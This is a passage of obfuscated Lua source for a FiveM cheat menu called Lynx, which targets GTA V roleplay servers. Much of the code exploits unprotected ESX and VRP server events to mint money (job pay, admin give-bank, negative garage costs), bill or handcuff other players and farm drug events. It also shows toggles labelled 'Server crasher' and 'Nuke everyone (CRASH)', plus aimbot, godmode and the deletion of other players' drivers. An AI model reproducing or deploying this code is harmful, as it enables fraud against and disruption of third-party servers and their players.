		lynxunknowncheats.CreateSubMenu("\69\83\88\66\111\115\115\10", "\83\101\114\118\101\114\77\101\110\117\10", "\69\83\88\32\66\111\115\115\32\77\101\110\117\115\10")
		lynxunknowncheats.CreateSubMenu("\69\83\88\77\111\110\101\121\10", "\83\101\114\118\101\114\77\101\110\117\10", "\69\83\88\32\77\111\110\101\121\32\79\112\116\105\111\110\115\10")
		lynxunknowncheats.CreateSubMenu("\69\83\88\77\105\115\99\10", "\83\101\114\118\101\114\77\101\110\117\10", "\69\83\88\32\77\105\115\99\32\79\112\116\105\111\110\115\10")
		lynxunknowncheats.CreateSubMenu("\69\83\88\68\114\117\103\115\10	", "\83\101\114\118\101\114\77\101\110\117\10", "\69\83\88\32\68\114\117\103\115\10")
		lynxunknowncheats.CreateSubMenu("\77\105\115\99\83\101\114\118\101\114\79\112\116\105\111\110\115\10", "\83\101\114\118\101\114\77\101\110\117\10", "\77\105\115\99\32\83\101\114\118\101\114\32\79\112\116\105\111\110\115\10")
		lynxunknowncheats.CreateSubMenu("\86\82\80\79\112\116\105\111\110\115\10", "\83\101\114\118\101\114\77\101\110\117\10", "\86\82\80\32\83\101\114\118\101\114\32\79\112\116\105\111\110\115\10")
 
		local SelectedPlayer
 
		while Enabled do
			if lynxunknowncheats.IsMenuOpened("\76\121\110\120\77\97\105\110\77\101\110\117\10") then
				drawNotification("\60\70\79\78\84\32\67\79\76\79\82\61\39\35\70\70\50\51\50\53\39\62\126\104\126\76\121\110\120\32\126\115\126\105\115\32\126\103\126\114\101\97\100\121\32\98\105\116\99\104\33\126\115\126\32\82\101\118\32\60\70\79\78\84\32\67\79\76\79\82\61\39\35\70\70\50\51\50\53\39\62\53\46\50\126\115\126\32\226\136\145\10")
				drawNotification("\89\111\117\32\97\114\101\32\117\115\105\110\103\32\76\121\110\120\32\82\101\118\126\110\126\32\60\70\79\78\84\32\67\79\76\79\82\61\39\35\70\70\50\51\50\53\39\62\69\110\106\111\121\32\58\51\10")
				if lynxunknowncheats.MenuButton("\126\104\126\83\101\108\102\32\77\101\110\117\10", "\83\101\108\102\77\101\110\117\10") then
				elseif lynxunknowncheats.MenuButton("\126\104\126\79\110\108\105\110\101\32\80\108\97\121\101\114\115\10", "\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117\10	") then
				elseif lynxunknowncheats.MenuButton("\126\104\126\88\112\111\115\101\100\10", "\88\112\111\115\101\100\10") then
				elseif lynxunknowncheats.MenuButton("\126\104\126\68\101\115\116\114\111\121\101\114\32\60\70\79\78\84\32\67\79\76\79\82\61\39\35\66\50\48\48\48\48\39\62\126\104\126\62\58\51\10", "\68\101\115\116\114\111\121\101\114\10") then
				elseif lynxunknowncheats.MenuButton("\126\104\126\84\101\108\101\112\111\114\116\32\77\101\110\117\10", "\84\101\108\101\112\111\114\116\77\101\110\117\10") then
				elseif lynxunknowncheats.MenuButton("\126\104\126\86\101\104\105\99\108\101\32\77\101\110\117\10", "\86\101\104\77\101\110\117\10") then
				elseif lynxunknowncheats.MenuButton("\126\104\126\87\101\97\112\111\110\32\77\101\110\117\10", "\87\101\112\77\101\110\117\10") then
				elseif lynxunknowncheats.MenuButton("\126\104\126\76\85\65\32\60\70\79\78\84\32\67\79\76\79\82\61\39\35\66\50\48\48\48\48\39\62\126\104\126\69\120\101\99\117\116\111\114\10", "\83\101\114\118\101\114\77\101\110\117\10") then
				elseif lynxunknowncheats.Button("\126\114\126\126\104\126\80\97\110\105\99\32\75\101\121\126\115\126\32\47\32\126\114\126\68\105\115\97\98\108\101\32\77\101\110\117\10") then
					Enabled = false
				elseif lynxunknowncheats.Button("\66\97\115\101\100\32\111\110\32\82\117\98\121\39\115\32\83\111\117\114\99\101\32\67\111\100\101\10") then
				end
 
				lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\83\101\108\102\77\101\110\117\10") then
				
				if
					lynxunknowncheats.CheckBox(
						"~h~~g~God~s~Mode",
						Godmode,
						function(enabled)
							Godmode = enabled
						end
					)
				 then
				elseif lynxunknowncheats.Button("~h~~r~Suicide") then
					SetEntityHealth(PlayerPedId(), 0)
				elseif lynxunknowncheats.Button("~h~~g~ESX~s~ ~s~Revive yourself~s~") then
					TriggerEvent("esx_ambulancejob:revive")
				elseif lynxunknowncheats.Button("~h~~g~Heal") then
					SetEntityHealth(PlayerPedId(), 200)
				elseif lynxunknowncheats.Button("~h~~b~Give Armour") then
					SetPedArmour(PlayerPedId(), 200)
				elseif
				lynxunknowncheats.CheckBox("~h~Infinite Stamina",InfStamina,function(enabled)InfStamina = enabled end)
				then
				elseif
				lynxunknowncheats.CheckBox("~h~Fast Run",fastrun,function(enabled)fastrun = enabled end)
				then
				elseif
				lynxunknowncheats.CheckBox(
					"~h~Super Jump",
					SuperJump,
					function(enabled)
					SuperJump = enabled
					end)
				then
				elseif
				lynxunknowncheats.CheckBox(
					"~h~Invisible",
					Invisible,
					function(enabled)
					Invisible = enabled
					end)
				then
				elseif
				lynxunknowncheats.CheckBox("~h~Noclip",Noclip,function(enabled)Noclip = enabled end)
				then	
				end
 
		lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\84\101\108\101\112\111\114\116\77\101\110\117\10") then
				
				if lynxunknowncheats.Button("~h~Teleport to waypoint") then
				TeleportToWaypoint()
 
				elseif lynxunknowncheats.Button("~h~Teleport into nearest vehicle") then
					local playerPed = GetPlayerPed(-1)
					local playerPedPos = GetEntityCoords(playerPed, true)
					local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
					local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
					local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
					local NearestPlanePos = GetEntityCoords(NearestPlane, true)
				drawNotification("~y~Wait...")
				Citizen.Wait(1000)
				if (NearestVehicle == 0) and (NearestPlane == 0) then
					drawNotification("~r~No Vehicle Found")
				elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
					if IsVehicleSeatFree(NearestPlane, -1) then
						SetPedIntoVehicle(playerPed, NearestPlane, -1)
						SetVehicleAlarm(NearestPlane, false)
						SetVehicleDoorsLocked(NearestPlane, 1)
						SetVehicleNeedsToBeHotwired(NearestPlane, false)
					else
						local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
						ClearPedTasksImmediately(driverPed)
						SetEntityAsMissionEntity(driverPed, 1, 1)
						DeleteEntity(driverPed)
						SetPedIntoVehicle(playerPed, NearestPlane, -1)
						SetVehicleAlarm(NearestPlane, false)
						SetVehicleDoorsLocked(NearestPlane, 1)
						SetVehicleNeedsToBeHotwired(NearestPlane, false)
					end
					drawNotification("~g~Teleported Into Nearest Vehicle!")
				elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
					if IsVehicleSeatFree(NearestVehicle, -1) then
						SetPedIntoVehicle(playerPed, NearestVehicle, -1)
						SetVehicleAlarm(NearestVehicle, false)
						SetVehicleDoorsLocked(NearestVehicle, 1)
						SetVehicleNeedsToBeHotwired(NearestVehicle, false)
					else
						local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
						ClearPedTasksImmediately(driverPed)
						SetEntityAsMissionEntity(driverPed, 1, 1)
						DeleteEntity(driverPed)
						SetPedIntoVehicle(playerPed, NearestVehicle, -1)
						SetVehicleAlarm(NearestVehicle, false)
						SetVehicleDoorsLocked(NearestVehicle, 1)
						SetVehicleNeedsToBeHotwired(NearestVehicle, false)
					end
					drawNotification("~g~Teleported Into Nearest Vehicle!")
				elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
					if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
						if IsVehicleSeatFree(NearestVehicle, -1) then
							SetPedIntoVehicle(playerPed, NearestVehicle, -1)
							SetVehicleAlarm(NearestVehicle, false)
							SetVehicleDoorsLocked(NearestVehicle, 1)
							SetVehicleNeedsToBeHotwired(NearestVehicle, false)
						else
							local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
							ClearPedTasksImmediately(driverPed)
							SetEntityAsMissionEntity(driverPed, 1, 1)
							DeleteEntity(driverPed)
							SetPedIntoVehicle(playerPed, NearestVehicle, -1)
							SetVehicleAlarm(NearestVehicle, false)
							SetVehicleDoorsLocked(NearestVehicle, 1)
							SetVehicleNeedsToBeHotwired(NearestVehicle, false)
						end
					elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
						if IsVehicleSeatFree(NearestPlane, -1) then
							SetPedIntoVehicle(playerPed, NearestPlane, -1)
							SetVehicleAlarm(NearestPlane, false)
							SetVehicleDoorsLocked(NearestPlane, 1)
							SetVehicleNeedsToBeHotwired(NearestPlane, false)
						else
							local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
							ClearPedTasksImmediately(driverPed)
							SetEntityAsMissionEntity(driverPed, 1, 1)
							DeleteEntity(driverPed)
							SetPedIntoVehicle(playerPed, NearestPlane, -1)
							SetVehicleAlarm(NearestPlane, false)
							SetVehicleDoorsLocked(NearestPlane, 1)
							SetVehicleNeedsToBeHotwired(NearestPlane, false)
						end
					end
					drawNotification("~g~Teleported Into Nearest Vehicle!")
				end
 
			 end
 
								
		lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\88\112\111\115\101\100\10") then
				
			if
				lynxunknowncheats.CheckBox(
				"~h~TriggerBot",
				TriggerBot,
				function(enabled)
				TriggerBot = enabled
				end)
			 then
			elseif
				lynxunknowncheats.CheckBox(
				"~h~AimBot",
				AimBot,
				function(enabled)
				AimBot = enabled
				end)
			then
			elseif
				lynxunknowncheats.CheckBox(
				"~h~ESP",
				esp,
				function(enabled)
				esp = enabled
				end)
			then
			elseif
				lynxunknowncheats.CheckBox(
				"~h~Player Blips",
				playerBlips,
				function(enabled)
				playerBlips = enabled
				end)
			then
			elseif
				lynxunknowncheats.CheckBox(
				"~h~~r~EMP~s~ Nearest Vehicles",
				destroyvehicles,
				function(enabled)
				destroyvehicles = enabled
				end) 
			then
			elseif
				lynxunknowncheats.CheckBox(
				"~h~~r~Explode~s~ Nearest Vehicles",
				explodevehicles,
				function(enabled)
				explodevehicles = enabled
				end) 
			then
			end
 
		lynxunknowncheats.Display()
		elseif lynxunknowncheats.IsMenuOpened("\68\101\115\116\114\111\121\101\114\10") then
			
			if
				lynxunknowncheats.CheckBox(
				"~h~Explode everyone",
				blowall,
				function(enabled)
				blowall = enabled
				end)
			then
			elseif
				lynxunknowncheats.CheckBox(
				"~h~~y~Nuke ~s~everyone ~r~(CRASH)",
				nuke,
				function(enabled)
				nuke = enabled
				end)
			then
			elseif
				lynxunknowncheats.CheckBox(
				"~h~~g~ESX ~r~DESTROY",
				esxdestroy,
				function(enabled)
				esxdestroy = enabled
				end)
			then
			elseif
				lynxunknowncheats.CheckBox(
				"~h~~r~Server crasher",
				servercrasher,
				function(enabled)
				servercrasher = enabled
				end)
			then
			end
 
				lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\87\101\112\77\101\110\117\10") then
				
				if lynxunknowncheats.Button("~h~~g~Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif lynxunknowncheats.Button("~h~~r~Remove All Weapons") then
					for i = 1, #allWeapons do
						RemoveAllPedWeapons(PlayerPedId(), true)
					end
				elseif lynxunknowncheats.Button("~h~~r~Give All Weapons to everyone") then
					for ids = 0, 64 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
								GiveWeaponToPed(PlayerPedId(ids), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end
			end
				elseif lynxunknowncheats.Button("~h~~r~Remove All Weapons from everyone") then
					for ids = 0, 64 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
							RemoveAllPedWeapons(PlayerPedId(ids), true)
				end	
			end
		end
				elseif lynxunknowncheats.Button("~h~Give Ammo") then
					for i = 1, #allWeapons do
						AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 200)
					end
				elseif lynxunknowncheats.MenuButton("~h~Give Specific Weapon", "\83\105\110\103\108\101\87\101\112\77\101\110\117\10") then
				elseif
					lynxunknowncheats.ComboBox(
						"~h~Weapon/Melee Damage",
						{"1x (Default)", "2x", "3x", "4x", "5x"},
						currentItemIndex,
						selectedItemIndex,
						function(currentIndex, selectedIndex)
							currentItemIndex = currentIndex
							selectedItemIndex = selectedIndex
							SetPlayerWeaponDamageModifier(PlayerId(), selectedItemIndex)
							SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedItemIndex)
						end
					)
				 then
				elseif
					lynxunknowncheats.CheckBox(
						"~h~~r~ONE SHOT KILL",
						oneshot,
						function(enabled)
							oneshot = enabled
						end)
				 then
				 elseif
				 lynxunknowncheats.CheckBox(
					 "~h~Infinite Ammo",
					 InfAmmo,
					 function(enabled)
						 InfAmmo = enabled
						 SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
					 end)
			  then
				 elseif
					 lynxunknowncheats.CheckBox("~h~Vehicle Gun",VehicleGun,
				 	 function(enabled)VehicleGun = enabled end) 
			 	then
			 	elseif
					 lynxunknowncheats.CheckBox("~h~Delete Gun",DeleteGun,
				 	 function(enabled)DeleteGun = enabled end) 
			 	then
				end
 
				lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\83\105\110\103\108\101\87\101\112\77\101\110\117\10") then
				for i = 1, #allWeapons do
					if lynxunknowncheats.Button(allWeapons[i]) then
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end
 
				lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\86\101\104\77\101\110\117\10") then
				
				if lynxunknowncheats.Button("~h~~g~Spawn Vehicle") then
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end
 
						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)
 
						SetPedIntoVehicle(PlayerPedId(), veh, -1)
					else
						drawNotification("~r~~h~Model is not valid!")
					end
				elseif lynxunknowncheats.Button("~h~Flip Vehicle") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
						SetVehicleOnGroundProperly(playerVeh)
						drawNotification("~g~Vehicle Flipped!")
					else
						drawNotification("~r~You Aren't In The Driverseat Of A Vehicle!")
					end
				elseif lynxunknowncheats.Button("~h~Repair Vehicle") then
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
				
				elseif lynxunknowncheats.Button("~h~Change License Plate") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					local result = KeyboardInput("Enter the plate license you want", "", 10)
					if result then
						SetVehicleNumberPlateText(playerVeh, result)
					end
 
				elseif lynxunknowncheats.Button("~h~Max Tuning") then
					MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
				elseif
					lynxunknowncheats.CheckBox(
					"~h~Rainbow Vehicle Colour",
					RainbowVeh,
					function(enabled)
					RainbowVeh = enabled
					end)
				then
				elseif lynxunknowncheats.Button("~h~~r~Delete Vehicle") then
					DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle Deleted")
				elseif lynxunknowncheats.Button("~h~Make vehicle dirty") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now dirty")
				elseif lynxunknowncheats.Button("~h~Make vehicle clean") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now clean")
				elseif
					lynxunknowncheats.CheckBox(
						"~h~No Fall",
						Nofall,
						function(enabled)
							Nofall = enabled
 
							SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
						end)
				 then
				elseif
					lynxunknowncheats.CheckBox(
						"~h~Vehicle Godmode",
						VehGod,
						function(enabled)
							VehGod = enabled
						end
					)
				 then
				elseif
					lynxunknowncheats.CheckBox(
					"~h~Speedboost ~g~SHIFT ~r~CTRL",
						VehSpeed,
						function(enabled)
						VehSpeed = enabled
						end)
				then
				end
 
				lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\83\101\114\118\101\114\77\101\110\117\10") then
				
				if lynxunknowncheats.MenuButton("~g~~h~ESX ~s~BOSS Menus", "\69\83\88\66\111\115\115\10") then
				elseif lynxunknowncheats.MenuButton("~g~~h~ESX ~s~Money Options", "\69\83\88\77\111\110\101\121\10") then
				elseif lynxunknowncheats.MenuButton("~g~~h~ESX ~s~Misc Options", "\69\83\88\77\105\115\99\10") then
				elseif lynxunknowncheats.MenuButton("~g~~h~ESX ~s~Drugs", "\69\83\88\68\114\117\103\115\10	") then
				elseif lynxunknowncheats.MenuButton("~b~~h~VRP ~s~Server Options", "\86\82\80\79\112\116\105\111\110\115\10") then
				elseif lynxunknowncheats.MenuButton("~o~~h~Misc ~s~Options", "\77\105\115\99\83\101\114\118\101\114\79\112\116\105\111\110\115\10") then
				end
 
				lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\69\83\88\66\111\115\115\10") then
				
				if lynxunknowncheats.Button("~c~~h~Mechanic~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","mecano",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif lynxunknowncheats.Button("~b~~h~Police~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","police",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif lynxunknowncheats.Button("~r~~h~Ambulance~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","ambulance",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif lynxunknowncheats.Button("~y~~h~Taxi~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","taxi",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif lynxunknowncheats.Button("~g~~h~Real Estate~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","realestateagent",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif lynxunknowncheats.Button("~p~~h~Gang~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","gang",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif lynxunknowncheats.Button("~o~~h~Car Dealer~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","cardealer",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif lynxunknowncheats.Button("~y~~h~Banker~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","banker",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				end
 
				lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\69\83\88\77\111\110\101\121\10") then
				
			if lynxunknowncheats.Button("~g~~h~ESX ~y~Caution Give Back") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
				TriggerServerEvent('esx_jobs:caution', 'give_back', result)
				end
			elseif lynxunknowncheats.Button("~g~~h~ESX ~y~TruckerJob Pay") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif lynxunknowncheats.Button("~g~~h~ESX ~y~Admin Give Bank") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif lynxunknowncheats.Button("~g~~h~ESX ~y~Admin Give Cash") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif lynxunknowncheats.Button("~g~~h~ESX ~y~GOPostalJob Pay") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif lynxunknowncheats.Button("~g~~h~ESX ~y~BankerJob Pay") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif lynxunknowncheats.Button("~g~~h~ESX ~y~Slot Machine") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			end
 
 
			lynxunknowncheats.Display()
				elseif lynxunknowncheats.IsMenuOpened("\69\83\88\77\105\115\99\10") then
					
				if lynxunknowncheats.Button("~w~~h~Set hunger to ~h~~g~100%") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif lynxunknowncheats.Button("~w~~h~Set thirst to ~h~~g~100%") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif lynxunknowncheats.Button("~g~~h~ESX ~y~Revive ~h~ID") then
					local id = KeyboardInput("Enter Player ID", "", 1000)
					if id then
					TriggerEvent("esx_ambulancejob:revive", GetPlayerServerId(i))
					end
				elseif lynxunknowncheats.Button("~g~~h~ESX ~r~SEND EVERYONE A BILL") then
                    local amount = KeyboardInput("Enter Amount", "", 100000000)
                    local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
                    if amount and name then
                    for i = 0, 64 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
                    end
				end
				elseif lynxunknowncheats.Button("~g~~h~ESX ~b~Handcuff ~h~ID") then
					local id = KeyboardInput("Enter Player ID", "", 1000)
					if id then
					TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(i))
					end
				elseif lynxunknowncheats.Button("~g~~h~ESX ~w~Get all licenses") then
					TriggerServerEvent('esx_dmvschool:addLicense', dmv)
					TriggerServerEvent('esx_dmvschool:addLicense', drive)
					TriggerServerEvent('esx_dmvschool:addLicense', drive_bike)
					TriggerServerEvent('esx_dmvschool:addLicense', drive_truck)
				end
 
				lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\77\105\115\99\83\101\114\118\101\114\79\112\116\105\111\110\115\10") then
				
				if lynxunknowncheats.Button("~h~Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif lynxunknowncheats.Button("~h~Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end
 
				lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\86\82\80\79\112\116\105\111\110\115\10") then
				
				if lynxunknowncheats.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end		
				elseif lynxunknowncheats.Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
					TriggerServerEvent("vrp_slotmachine:server:2", result)
					end
				elseif lynxunknowncheats.Button("~r~~h~VRP ~s~Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif lynxunknowncheats.Button("~r~~h~VRP ~s~Bank Deposit") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:deposit", result)
					end
				elseif lynxunknowncheats.Button("~r~~h~VRP ~s~Bank Withdraw ") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:withdraw", result)
					end
			end
 
 
				lynxunknowncheats.Display()
			elseif lynxunknowncheats.IsMenuOpened("\69\83\88\68\114\117\103\115\10	") then
				
				if lynxunknowncheats.Button("~h~~g~Harvest ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
				elseif lynxunknowncheats.Button("~h~~g~Transform ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
				elseif lynxunknowncheats.Button("~h~~g~Sell ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
				elseif lynxunknowncheats.Button("~h~~w~Harvest ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
				elseif lynxunknowncheats.Button("~h~~w~Transform ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
				elseif lynxunknowncheats.Button("~h~~w~Sell ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
				elseif lynxunknowncheats.Button("~h~~r~Harvest Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
				elseif lynxunknowncheats.Button("~h~~r~Transform Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
				elseif lynxunknowncheats.Button("~h~~r~Sell Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
				elseif lynxunknowncheats.Button("~h~~p~Harvest Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
				elseif lynxunknowncheats.Button("~h~~p~Transform Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
				elseif lynxunknowncheats.Button("~h~~p~Sell Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
				elseif lynxunknowncheats.Button("~h~~g~Money Wash ~c~(x10)") then
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
